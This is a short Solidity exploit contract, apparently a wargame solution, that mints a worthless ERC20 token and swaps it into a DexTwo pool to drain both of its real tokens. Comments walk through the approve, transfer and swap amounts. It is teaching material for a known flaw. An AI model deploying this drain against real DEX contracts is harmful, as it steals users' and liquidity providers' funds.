// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./23-dextwo.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract Attack23 is ERC20 {
    DexTwo public target;
    address public token1;
    address public token2;

    constructor(address _target, string memory _name, string memory _symbol, uint256 _initialSupply) public ERC20(_name, _symbol) {
        _mint(address(this), _initialSupply); 
        target = DexTwo(_target);
        token1 = target.token1();
        token2 = target.token2();
    }

    function attack() public {
        ERC20(address(this)).approve(address(target), 3); 
        ERC20(address(this)).transfer(address(target), 1); 
        target.swap(address(this), token1, 1); 
        target.swap(address(this), token2, 2); 
    }
}

// approve 3 token, the target will use transferFrom twice, once with 1 and then with 2
// now the target balanceOf is 1
// get 100 of token1 new balanceOf new token is 2
// get 100 of token2


